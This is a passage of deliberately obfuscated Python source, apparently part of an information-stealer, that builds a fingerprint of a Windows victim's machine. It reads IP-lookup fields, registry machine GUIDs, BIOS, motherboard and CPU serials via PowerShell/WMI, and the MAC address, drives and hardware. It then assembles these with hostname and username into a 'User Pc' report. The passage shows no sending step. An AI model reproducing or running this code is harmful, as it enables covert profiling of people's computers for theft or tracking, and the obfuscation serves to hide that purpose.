    CPCKCNKVNATABZXGSVSHNQMUWXDKAVKAOMROJBUGRAUAXTCWXC = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('timezone', "None")
    FKSRIHDMYJORTTBNRUVOALIAVHEHWPAMDKPTQQWFEGSHPNJSPGKAFAPLINXIXKIIWJOTLXEVBTJWBLORKTWYG = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('isp', "None")
    QPSIUITEKWVZENVSKCXUNQCABFKTOXAWQEQQODLHBXWGQILSPOTKXNYKUZAXIOLBBKRUMZDLKSHWLFJKVATSAGKVBHLRKORJ = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('org', "None")
    OZQZGSRDYJTLQSYCRMKTQLNAAADTWNUJAHSAFDMHUJOZUVNMMHXAAN = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('as', "None")

def EQGUTINPLTZNBMWNAMXFWKNUUICGXVWUJUUIESDDEODROIPQGDRTWITRQIHIICLAOISPYPYTDLOFVIXQGL(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA):
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import winreg

    try: KWYBPSBNXGVHRUARMQEEVJEGKOEZEWQAGRLFEWFPASJCEBEHYULPUBABCTTWYHRVGKLZFMTYJXGTLPQJSEYMRGXGXHET = platform.system()
    except: KWYBPSBNXGVHRUARMQEEVJEGKOEZEWQAGRLFEWFPASJCEBEHYULPUBABCTTWYHRVGKLZFMTYJXGTLPQJSEYMRGXGXHET = "None"

    try: MUOYCNRHVKYVRUGSMBMKPDRVUEBJOFTVHMCUHPXDWQNXWLPKIUMLRBALIGWEYPZIXVLKHRPLXBCSSLGOQAG = platform.version()
    except: MUOYCNRHVKYVRUGSMBMKPDRVUEBJOFTVHMCUHPXDWQNXWLPKIUMLRBALIGWEYPZIXVLKHRPLXBCSSLGOQAG = "None"

    try: RHXGEYXYEJXNMDCRXPGGBTICRVRJASKRRRKUNJUYAGDAMLOBIYGNPDICULRSHWKRXGHIBACSQRH = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: RHXGEYXYEJXNMDCRXPGGBTICRVRJASKRRRKUNJUYAGDAMLOBIYGNPDICULRSHWKRXGHIBACSQRH = "None"

    try: XWOVLYZNMNNBMQZPZFODIGGCKJMXNKCMLSSKHQEKUXYQLEQPHFLUPYO = str(round(psutil.virtual_memory().total / (1024**3), 2)) + "Go"
    except: XWOVLYZNMNNBMQZPZFODIGGCKJMXNKCMLSSKHQEKUXYQLEQPHFLUPYO = "None"

    try: UEVOLIWZMXYHEWLDPWXJHCWRUDWVUKFTFVNBFSVBBDNIATVESISITTWDYPBTRFJTRSKPRURDPATYRLJNNSP = platform.processor()
    except: UEVOLIWZMXYHEWLDPWXJHCWRUDWVUKFTFVNBFSVBBDNIATVESISITTWDYPBTRFJTRSKPRURDPATYRLJNNSP = "None"

    try: NDUHYVUFLSHGHCRYVGTQAPNRRVVGPUZPURDJYWQOBSWMTYCURWVKDWGUUTPJBNJHXYZQEYPIYK = str(psutil.cpu_count(logical=False)) + " Core"
    except: NDUHYVUFLSHGHCRYVGTQAPNRRVVGPUZPURDJYWQOBSWMTYCURWVKDWGUUTPJBNJHXYZQEYPIYK = "None"

    try: UKVWCCRSQZXIBJDJHLAILJSMBXMNRCNSTUAQOHXXYOATKANJOURCYOEYFYCKMVPYHJFYKHRRFVGSGWLSWCDNT = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: UKVWCCRSQZXIBJDJHLAILJSMBXMNRCNSTUAQOHXXYOATKANJOURCYOEYFYCKMVPYHJFYKHRRFVGSGWLSWCDNT = "None"

    ZLFMSUPPISSCNCHOSAWICJSYGPKUNYSQDVEOAMWLRRXSQZSVNMKJWDADFXYOEZJDAZSIZFGAYJKBZXZFHCEPHBVLSAODPZYNGHT                 = r"SOFTWARE\Microsoft\Cryptography"
    HWPZGIUAFMXZWPTSVJDZTGXBKPCVETWWZTQYJQYZPCIOPMMWQHZOMNADQKWMGRBNACXJFBRRIXFPBRTDQSIMJYPQNR                    = r"SOFTWARE\Microsoft\SQMClient"
    PIEVASDWTFWGPLBRIPLDIMGCAHLQLGHEWLTIKUMFCJZDOAZFCNCDKLLJHKGGZNWOLACEONFC             = r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001"
    UTXIQICGZMOEQNTEUTIANJFGZOUQOFJPMMHIHDLKDJFNEUIKOIUJPXWOWFTVQXPOUKQIRQXNKQAWQYBLHALEHXGJVTYZKGURCAVK                       = r'SOFTWARE\NVIDIA Corporation'
    CKDLWPRGBCKBMEORBSTNQGXKLECTKHPVUNEILGSVRSWWUKGYFMLNMFUIYWJ               = r'SYSTEM\HardwareConfig\Current'

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ZLFMSUPPISSCNCHOSAWICJSYGPKUNYSQDVEOAMWLRRXSQZSVNMKJWDADFXYOEZJDAZSIZFGAYJKBZXZFHCEPHBVLSAODPZYNGHT, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineGuid")
            BCSGXQUOETBBQWGNASPEKPYUGJYDEKJPDCGNKBPPQHIDTUWIXOLFBNRJWYUYGHMHNXQTHTBN = str(v4r_value).replace("{", "").replace("}", "")
    except: BCSGXQUOETBBQWGNASPEKPYUGJYDEKJPDCGNKBPPQHIDTUWIXOLFBNRJWYUYGHMHNXQTHTBN = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, PIEVASDWTFWGPLBRIPLDIMGCAHLQLGHEWLTIKUMFCJZDOAZFCNCDKLLJHKGGZNWOLACEONFC, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "GUID")
            QAUFUZJQTDQDWESVDUXZLDMHDMMUXZJYITZXTHOSIPFBSUDRXFGJSCTE = str(v4r_value).replace("{", "").replace("}", "")
    except: QAUFUZJQTDQDWESVDUXZLDMHDMMUXZJYITZXTHOSIPFBSUDRXFGJSCTE = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, PIEVASDWTFWGPLBRIPLDIMGCAHLQLGHEWLTIKUMFCJZDOAZFCNCDKLLJHKGGZNWOLACEONFC, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "HwProfileGuid")
            MWMEBFBMZKKFXPTXMGJBZUCWTZWDGNREBNPNEFYGRZBKRYJGFCWODUQOJJNIICTOYGXGGHFKOEKBHQNABMOQLGEIACZITANMGL = str(v4r_value).replace("{", "").replace("}", "")
    except: MWMEBFBMZKKFXPTXMGJBZUCWTZWDGNREBNPNEFYGRZBKRYJGFCWODUQOJJNIICTOYGXGGHFKOEKBHQNABMOQLGEIACZITANMGL = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, HWPZGIUAFMXZWPTSVJDZTGXBKPCVETWWZTQYJQYZPCIOPMMWQHZOMNADQKWMGRBNACXJFBRRIXFPBRTDQSIMJYPQNR, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineId")
            UGJEZHIBTWHVXAUXOATPLTPEBKVWWNHUCMGTGWDYPFZSUXBYIDTKGVUGTXGUXYTQAEADRAYREVN = str(v4r_value).replace("{", "").replace("}", "")
    except: UGJEZHIBTWHVXAUXOATPLTPEBKVWWNHUCMGTGWDYPFZSUXBYIDTKGVUGTXGUXYTQAEADRAYREVN = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, UTXIQICGZMOEQNTEUTIANJFGZOUQOFJPMMHIHDLKDJFNEUIKOIUJPXWOWFTVQXPOUKQIRQXNKQAWQYBLHALEHXGJVTYZKGURCAVK+r'\Installer2', 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemID")
            EJPDVVERWOLVVRBXFYLCQUXOSLSJIAXYNOSIIMUAYNQXDYZWQYJ = str(v4r_value).replace("{", "").replace("}", "")
    except: EJPDVVERWOLVVRBXFYLCQUXOSLSJIAXYNOSIIMUAYNQXDYZWQYJ = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, CKDLWPRGBCKBMEORBSTNQGXKLECTKHPVUNEILGSVRSWWUKGYFMLNMFUIYWJ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardProduct")
            TXSGKELQAPEBMEWYOHUVJNGWGKKTPHRJTNMNNPYCIZVOYZOZMURAJAMO = str(v4r_value).replace("{", "").replace("}", "")
    except: TXSGKELQAPEBMEWYOHUVJNGWGKKTPHRJTNMNNPYCIZVOYZOZMURAJAMO = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, CKDLWPRGBCKBMEORBSTNQGXKLECTKHPVUNEILGSVRSWWUKGYFMLNMFUIYWJ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardManufacturer")
            LXYZVHJHFEXWYTTZSBDNCPURGKIXVUPBORGPXIRLMRTHADWFDG = str(v4r_value).replace("{", "").replace("}", "")
    except: LXYZVHJHFEXWYTTZSBDNCPURGKIXVUPBORGPXIRLMRTHADWFDG = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, CKDLWPRGBCKBMEORBSTNQGXKLECTKHPVUNEILGSVRSWWUKGYFMLNMFUIYWJ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSReleaseDate")
            BJCTAYRIOQPCWVNOEUPKDQXHOWJPLONSBKXDYHVIHNUJAHWXLZBLPHZOTEW = str(v4r_value).replace("{", "").replace("}", "")
    except: BJCTAYRIOQPCWVNOEUPKDQXHOWJPLONSBKXDYHVIHNUJAHWXLZBLPHZOTEW = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, CKDLWPRGBCKBMEORBSTNQGXKLECTKHPVUNEILGSVRSWWUKGYFMLNMFUIYWJ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSVersion")
            WCVEJQJIJHQTSGDVHHDIPINXSZIWMHJXABEAGCDVIWTVXWJBJEZAGMLZEUHSMAU = str(v4r_value).replace("{", "").replace("}", "")
    except: WCVEJQJIJHQTSGDVHHDIPINXSZIWMHJXABEAGCDVIWTVXWJBJEZAGMLZEUHSMAU = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, CKDLWPRGBCKBMEORBSTNQGXKLECTKHPVUNEILGSVRSWWUKGYFMLNMFUIYWJ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemBiosVersion")
            XRPUOCFAWMASUVOOVVYHIASTOZZGBHQHRRBGOKNCTOQIIWSCTWKVHWQDJLMFJKFILZCLYBDCBJLUEKPZXEBDSSDTCOHRVDIHOTA = str(v4r_value).replace("{", "").replace("}", "")
    except: XRPUOCFAWMASUVOOVVYHIASTOZZGBHQHRRBGOKNCTOQIIWSCTWKVHWQDJLMFJKFILZCLYBDCBJLUEKPZXEBDSSDTCOHRVDIHOTA = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, CKDLWPRGBCKBMEORBSTNQGXKLECTKHPVUNEILGSVRSWWUKGYFMLNMFUIYWJ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemVersion")
            ULISAGPCRIWMSKRPOEBJLGAFEJYBRHGPMGYGOKKQFZQZTWVOEAKTJMROFBUNJVAURHPUJUTSPVDQDIVUVTYFJUMBV = str(v4r_value).replace("{", "").replace("}", "")
    except: ULISAGPCRIWMSKRPOEBJLGAFEJYBRHGPMGYGOKKQFZQZTWVOEAKTJMROFBUNJVAURHPUJUTSPVDQDIVUVTYFJUMBV = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, CKDLWPRGBCKBMEORBSTNQGXKLECTKHPVUNEILGSVRSWWUKGYFMLNMFUIYWJ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemFamily")
            NAWJYTIODIOVVXESYQYPVGFQRDGVHMJMUYNWMLBAJFMEUBDOXMANELAAPHMKWOKCJE = str(v4r_value).replace("{", "").replace("}", "")
    except: NAWJYTIODIOVVXESYQYPVGFQRDGVHMJMUYNWMLBAJFMEUBDOXMANELAAPHMKWOKCJE = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, CKDLWPRGBCKBMEORBSTNQGXKLECTKHPVUNEILGSVRSWWUKGYFMLNMFUIYWJ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemManufacturer")
            NIOZEMDKKNRFCXBFIWPHHSXXDAPPRCRQZTYYLHHHUAEEQQZNHCVOFEOAPMRNYOPKSRZXYWIJBKYYURYWUTMDCZUIWREXZGKKQABU = str(v4r_value).replace("{", "").replace("}", "")
    except: NIOZEMDKKNRFCXBFIWPHHSXXDAPPRCRQZTYYLHHHUAEEQQZNHCVOFEOAPMRNYOPKSRZXYWIJBKYYURYWUTMDCZUIWREXZGKKQABU = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, CKDLWPRGBCKBMEORBSTNQGXKLECTKHPVUNEILGSVRSWWUKGYFMLNMFUIYWJ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemProductName")
            SSAYYILJDJYPSIKOOUAQUXYXPEOWAYPDVTZDTTQCPDBQURZJDIBKHJOIKUKNJTU = str(v4r_value).replace("{", "").replace("}", "")
    except: SSAYYILJDJYPSIKOOUAQUXYXPEOWAYPDVTZDTTQCPDBQURZJDIBKHJOIKUKNJTU = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, CKDLWPRGBCKBMEORBSTNQGXKLECTKHPVUNEILGSVRSWWUKGYFMLNMFUIYWJ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemSKU")
            ZYBEKKMTGEQGGGMHZRLFXYPXUNBJOFYNXNUEKFZHGDEIOSXAYMHYYRRDRTJSHJMKFTZLEDYXRAWPCYEIGDRXXYTKSHWOMXJC = str(v4r_value).replace("{", "").replace("}", "")
    except: ZYBEKKMTGEQGGGMHZRLFXYPXUNBJOFYNXNUEKFZHGDEIOSXAYMHYYRRDRTJSHJMKFTZLEDYXRAWPCYEIGDRXXYTKSHWOMXJC = None

    def RunPowershell(query):
        try:
            result = subprocess.check_output(
                ['powershell', '-Command', query],
                stderr=subprocess.STDOUT,
                text=True
            ).split('\n')[0].strip()
            return result if result else None
        except:
            return None

    try: LUTBHTULMPWQIGFKWDEZZDBDVITJMOMYKTVLOTSPKRYEUQSKLEEWQRUFRSDBYPUUTPDTBLUNBFQB = RunPowershell("(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID")
    except: LUTBHTULMPWQIGFKWDEZZDBDVITJMOMYKTVLOTSPKRYEUQSKLEEWQRUFRSDBYPUUTPDTBLUNBFQB = None

    try: SSQWUBEBYCMGHUBWCDGLAIIMYWKVQIQTNLIAZMCXBCKREXEUAPBXODLBQRSI = RunPowershell("(Get-WmiObject -Class Win32_BIOS).SerialNumber")
    except: SSQWUBEBYCMGHUBWCDGLAIIMYWKVQIQTNLIAZMCXBCKREXEUAPBXODLBQRSI = None

    try: DQVRYFECTYVJNPVHJJCMIACXDSVISKITLUIQYOEEVOAFAKTPCBESFCCUBSUMNZTRUNOHQSOGTTYXHQX = RunPowershell("(Get-WmiObject -Class Win32_BaseBoard).SerialNumber")
    except: DQVRYFECTYVJNPVHJJCMIACXDSVISKITLUIQYOEEVOAFAKTPCBESFCCUBSUMNZTRUNOHQSOGTTYXHQX = None

    try: KYSXHJVANMTKGEYWRDVQDNFGSJDHDNWEBEKYIHQOBCOTXGDBIHZYLIDEQTHYNQPV = RunPowershell("(Get-WmiObject -Class Win32_Processor).ProcessorId")
    except: KYSXHJVANMTKGEYWRDVQDNFGSJDHDNWEBEKYIHQOBCOTXGDBIHZYLIDEQTHYNQPV = None

    try: HFTQQBEHSNJNZEMGMSISAYVQPDACYVSZSTMOAGSRCTCYRXIBIRGTJCZMHFGZCSHGYRUCUYS = RunPowershell("(Get-WmiObject -Class Win32_BIOS).OEMStringArray")
    except: HFTQQBEHSNJNZEMGMSISAYVQPDACYVSZSTMOAGSRCTCYRXIBIRGTJCZMHFGZCSHGYRUCUYS = None

    try: WMHSGRGAALHOOFWQXTPEPBXXWSHPYGFAGJVRXKMATVAABXSTKKZPLTLVQKCTYLNDQUBIHVEKQFY = RunPowershell("(Get-WmiObject -Class Win32_SystemEnclosure).SMBIOSAssetTag")
    except: WMHSGRGAALHOOFWQXTPEPBXXWSHPYGFAGJVRXKMATVAABXSTKKZPLTLVQKCTYLNDQUBIHVEKQFY = None
        
    try:
        ZADDKTPURUZAUZMLKHUYPGNBMUHIZHBNEFCCUUBCWXXGLKVPMOJPLJGQEOSHYKQAOPQKDN = []
        HFKQEIKRIOBRLFRSCAKJYTTKPRGLSZROXNUFSSGEZKNDQAAYXNIPROLAZNZERVLBUBRVWBHVRTRICZBJLSWIAN = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if HFKQEIKRIOBRLFRSCAKJYTTKPRGLSZROXNUFSSGEZKNDQAAYXNIPROLAZNZERVLBUBRVWBHVRTRICZBJLSWIAN & 1:
                JAAJGLFGLJFKKBFJXGUCMWIHWCEFCNPAZDTKGTWQKBRANQBMALWPRMGQJUPYJM = v4r_letter + ":\\"
                try:
                    PJWAKAATMRTHRLUNUSXVHMCBWHWVHLQLDASTHAPPEQGTTUJQZGDOFWAMLBMNGLOYBZWSKKT = ctypes.c_ulonglong(0)
                    SFTFEGSQSEKEKGTTRKREETPXOAFDDUBYULDCVMYEZOYSRXTFHIGJPPHMARYUYCFGWR = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(JAAJGLFGLJFKKBFJXGUCMWIHWCEFCNPAZDTKGTWQKBRANQBMALWPRMGQJUPYJM), None, ctypes.pointer(SFTFEGSQSEKEKGTTRKREETPXOAFDDUBYULDCVMYEZOYSRXTFHIGJPPHMARYUYCFGWR), ctypes.pointer(PJWAKAATMRTHRLUNUSXVHMCBWHWVHLQLDASTHAPPEQGTTUJQZGDOFWAMLBMNGLOYBZWSKKT))
                    DPYDCLWNJRMNQSFCJLCNOVKIXJXALWJFSCBAIYNWZNTKWIQWYWAIDWQKBBNQHASNGGE = SFTFEGSQSEKEKGTTRKREETPXOAFDDUBYULDCVMYEZOYSRXTFHIGJPPHMARYUYCFGWR.value
                    KDKMSMLPIAZOHJWQSXQKACEWSPXGWDZFYGXBREVNHCVWOZQSROTPMDMTMJDKMZPKDVP = PJWAKAATMRTHRLUNUSXVHMCBWHWVHLQLDASTHAPPEQGTTUJQZGDOFWAMLBMNGLOYBZWSKKT.value
                    AFVYSOFPBUFZRKGNHSSWBVVKAPRSXEHLFOBSUFQRCZDDAUXUNJKLRBTUEVVJNMEAFGMTDTULVMXQPSMDXLWSPWLZINZJW = DPYDCLWNJRMNQSFCJLCNOVKIXJXALWJFSCBAIYNWZNTKWIQWYWAIDWQKBBNQHASNGGE - KDKMSMLPIAZOHJWQSXQKACEWSPXGWDZFYGXBREVNHCVWOZQSROTPMDMTMJDKMZPKDVP
                    JRZYQEQWAQJXBIZOTIZIFERDSUGXBCCLEWTLYPZUYVVSJWNZUULPLVUA = win32api.GetVolumeInformation(JAAJGLFGLJFKKBFJXGUCMWIHWCEFCNPAZDTKGTWQKBRANQBMALWPRMGQJUPYJM)[0]
                    drive = {
                        'drive': JAAJGLFGLJFKKBFJXGUCMWIHWCEFCNPAZDTKGTWQKBRANQBMALWPRMGQJUPYJM,
                        'total': DPYDCLWNJRMNQSFCJLCNOVKIXJXALWJFSCBAIYNWZNTKWIQWYWAIDWQKBBNQHASNGGE,
                        'free': KDKMSMLPIAZOHJWQSXQKACEWSPXGWDZFYGXBREVNHCVWOZQSROTPMDMTMJDKMZPKDVP,
                        'used': AFVYSOFPBUFZRKGNHSSWBVVKAPRSXEHLFOBSUFQRCZDDAUXUNJKLRBTUEVVJNMEAFGMTDTULVMXQPSMDXLWSPWLZINZJW,
                        'name': JRZYQEQWAQJXBIZOTIZIFERDSUGXBCCLEWTLYPZUYVVSJWNZUULPLVUA,
                    }
                    ZADDKTPURUZAUZMLKHUYPGNBMUHIZHBNEFCCUUBCWXXGLKVPMOJPLJGQEOSHYKQAOPQKDN.append(drive)
                except:
                    ()
            HFKQEIKRIOBRLFRSCAKJYTTKPRGLSZROXNUFSSGEZKNDQAAYXNIPROLAZNZERVLBUBRVWBHVRTRICZBJLSWIAN >>= 1

        SSYGTPNRVQFZLKCPZAARIGBOMOHSAUGIPEXJVJWWUERXKNXHVMGMXZPJHTTEAPKVMHK = "   {:<7} {:<10} {:<10} {:<10} {:<20}".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in ZADDKTPURUZAUZMLKHUYPGNBMUHIZHBNEFCCUUBCWXXGLKVPMOJPLJGQEOSHYKQAOPQKDN:
            QHIGYEODTWZBWAYKUZYJYCNGWYXTHWASTRFJVPIGPTPCJFNNWZ = (v4r_drive['used'] / v4r_drive['total']) * 100
            KDKMSMLPIAZOHJWQSXQKACEWSPXGWDZFYGXBREVNHCVWOZQSROTPMDMTMJDKMZPKDVP_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            DPYDCLWNJRMNQSFCJLCNOVKIXJXALWJFSCBAIYNWZNTKWIQWYWAIDWQKBBNQHASNGGE_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            QHIGYEODTWZBWAYKUZYJYCNGWYXTHWASTRFJVPIGPTPCJFNNWZ_str = "{:.2f}%".format(QHIGYEODTWZBWAYKUZYJYCNGWYXTHWASTRFJVPIGPTPCJFNNWZ)
            SSYGTPNRVQFZLKCPZAARIGBOMOHSAUGIPEXJVJWWUERXKNXHVMGMXZPJHTTEAPKVMHK += "\n - {:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   KDKMSMLPIAZOHJWQSXQKACEWSPXGWDZFYGXBREVNHCVWOZQSROTPMDMTMJDKMZPKDVP_gb,
                                                                   DPYDCLWNJRMNQSFCJLCNOVKIXJXALWJFSCBAIYNWZNTKWIQWYWAIDWQKBBNQHASNGGE_gb,
                                                                   QHIGYEODTWZBWAYKUZYJYCNGWYXTHWASTRFJVPIGPTPCJFNNWZ_str,
                                                                   v4r_drive['name'])
    except:
        SSYGTPNRVQFZLKCPZAARIGBOMOHSAUGIPEXJVJWWUERXKNXHVMGMXZPJHTTEAPKVMHK = """   Drive:  Free:      Total:     Use:       Name:       
   None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            SPUDQTBBKPNFRYQQGPLXPIKNYLRVJGZQLMTYKPFODEECZXZFUMWHIVY = 'Pc Portable'
        else:
            SPUDQTBBKPNFRYQQGPLXPIKNYLRVJGZQLMTYKPFODEECZXZFUMWHIVY = 'Pc Fixed'
    except:
        SPUDQTBBKPNFRYQQGPLXPIKNYLRVJGZQLMTYKPFODEECZXZFUMWHIVY = "None"

    try: RRFRDRTOVBFKEOVZXXGQQSURDJCBAUFNURBGFUZNJIQMAZNXVDXOJIURFCRUOKVORQGUQCDUIYUC = len(screeninfo.get_monitors())
    except: RRFRDRTOVBFKEOVZXXGQQSURDJCBAUFNURBGFUZNJIQMAZNXVDXOJIURFCRUOKVORQGUQCDUIYUC = "None"

    MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_system_info = "Yes"
    WRMQQTMXNZZEPBZTYAEOMDFTDYQZMWDRJGTDMODEQIWUGOXXGAFRUAVNF = f"""
User Pc:
 - Hostname    : {KSEIFZCAVIJFXKVVEEMJQGSVLTQHITZXQLEAGGKHAYOSXEFZAPAPDVJGDQDGJRIFJQLHZZMAA}
 - Username    : {HWQZSVDFSIMSQBVEEPJSHAGWWTAVYRKQYHEODTUOURJDPQFBMOOVDF}
 - DisplayName : {EBPUGGZBUXZTJUUNAKAQNHVLKGYYRJWFIELCDLRBFTNWWBDDSZLKIDVJHWJUZES}

System:
 - Plateform     : {SPUDQTBBKPNFRYQQGPLXPIKNYLRVJGZQLMTYKPFODEECZXZFUMWHIVY}
 - Exploitation  : {KWYBPSBNXGVHRUARMQEEVJEGKOEZEWQAGRLFEWFPASJCEBEHYULPUBABCTTWYHRVGKLZFMTYJXGTLPQJSEYMRGXGXHET} {MUOYCNRHVKYVRUGSMBMKPDRVUEBJOFTVHMCUHPXDWQNXWLPKIUMLRBALIGWEYPZIXVLKHRPLXBCSSLGOQAG}
 - Screen Number : {RRFRDRTOVBFKEOVZXXGQQSURDJCBAUFNURBGFUZNJIQMAZNXVDXOJIURFCRUOKVORQGUQCDUIYUC}

Peripheral:
 - CPU : {UEVOLIWZMXYHEWLDPWXJHCWRUDWVUKFTFVNBFSVBBDNIATVESISITTWDYPBTRFJTRSKPRURDPATYRLJNNSP}, {NDUHYVUFLSHGHCRYVGTQAPNRRVVGPUZPURDJYWQOBSWMTYCURWVKDWGUUTPJBNJHXYZQEYPIYK} 
 - GPU : {UKVWCCRSQZXIBJDJHLAILJSMBXMNRCNSTUAQOHXXYOATKANJOURCYOEYFYCKMVPYHJFYKHRRFVGSGWLSWCDNT}
 - RAM : {XWOVLYZNMNNBMQZPZFODIGGCKJMXNKCMLSSKHQEKUXYQLEQPHFLUPYO}

Disk:
{SSYGTPNRVQFZLKCPZAARIGBOMOHSAUGIPEXJVJWWUERXKNXHVMGMXZPJHTTEAPKVMHK}

Serial Number:
 - MAC                       : {RHXGEYXYEJXNMDCRXPGGBTICRVRJASKRRRKUNJUYAGDAMLOBIYGNPDICULRSHWKRXGHIBACSQRH}
 - Machine Id                : {UGJEZHIBTWHVXAUXOATPLTPEBKVWWNHUCMGTGWDYPFZSUXBYIDTKGVUGTXGUXYTQAEADRAYREVN}
 - Machine Guid              : {BCSGXQUOETBBQWGNASPEKPYUGJYDEKJPDCGNKBPPQHIDTUWIXOLFBNRJWYUYGHMHNXQTHTBN}
 - Hw Profile Guid           : {MWMEBFBMZKKFXPTXMGJBZUCWTZWDGNREBNPNEFYGRZBKRYJGFCWODUQOJJNIICTOYGXGGHFKOEKBHQNABMOQLGEIACZITANMGL}
 - Nvidia System Id          : {EJPDVVERWOLVVRBXFYLCQUXOSLSJIAXYNOSIIMUAYNQXDYZWQYJ}
 - Guid Serial Number        : {QAUFUZJQTDQDWESVDUXZLDMHDMMUXZJYITZXTHOSIPFBSUDRXFGJSCTE}
 - Uuid Serial Number        : {LUTBHTULMPWQIGFKWDEZZDBDVITJMOMYKTVLOTSPKRYEUQSKLEEWQRUFRSDBYPUUTPDTBLUNBFQB}
 - Motherboard Serial Number : {DQVRYFECTYVJNPVHJJCMIACXDSVISKITLUIQYOEEVOAFAKTPCBESFCCUBSUMNZTRUNOHQSOGTTYXHQX}
 - Motherboard Product       : {TXSGKELQAPEBMEWYOHUVJNGWGKKTPHRJTNMNNPYCIZVOYZOZMURAJAMO}
 - Motherboard Manufacturer  : {LXYZVHJHFEXWYTTZSBDNCPURGKIXVUPBORGPXIRLMRTHADWFDG}
 - Processor Serial Number   : {KYSXHJVANMTKGEYWRDVQDNFGSJDHDNWEBEKYIHQOBCOTXGDBIHZYLIDEQTHYNQPV}
 - Bios Serial Number        : {SSQWUBEBYCMGHUBWCDGLAIIMYWKVQIQTNLIAZMCXBCKREXEUAPBXODLBQRSI}
 - Bios Release Date         : {BJCTAYRIOQPCWVNOEUPKDQXHOWJPLONSBKXDYHVIHNUJAHWXLZBLPHZOTEW}
 - Bios Version              : {WCVEJQJIJHQTSGDVHHDIPINXSZIWMHJXABEAGCDVIWTVXWJBJEZAGMLZEUHSMAU}
 - System Bios Version       : {XRPUOCFAWMASUVOOVVYHIASTOZZGBHQHRRBGOKNCTOQIIWSCTWKVHWQDJLMFJKFILZCLYBDCBJLUEKPZXEBDSSDTCOHRVDIHOTA}
 - System Version            : {ULISAGPCRIWMSKRPOEBJLGAFEJYBRHGPMGYGOKKQFZQZTWVOEAKTJMROFBUNJVAURHPUJUTSPVDQDIVUVTYFJUMBV}
 - System Family             : {NAWJYTIODIOVVXESYQYPVGFQRDGVHMJMUYNWMLBAJFMEUBDOXMANELAAPHMKWOKCJE}
 - System Manufacturer       : {NIOZEMDKKNRFCXBFIWPHHSXXDAPPRCRQZTYYLHHHUAEEQQZNHCVOFEOAPMRNYOPKSRZXYWIJBKYYURYWUTMDCZUIWREXZGKKQABU}
 - System Product            : {SSAYYILJDJYPSIKOOUAQUXYXPEOWAYPDVTZDTTQCPDBQURZJDIBKHJOIKUKNJTU}
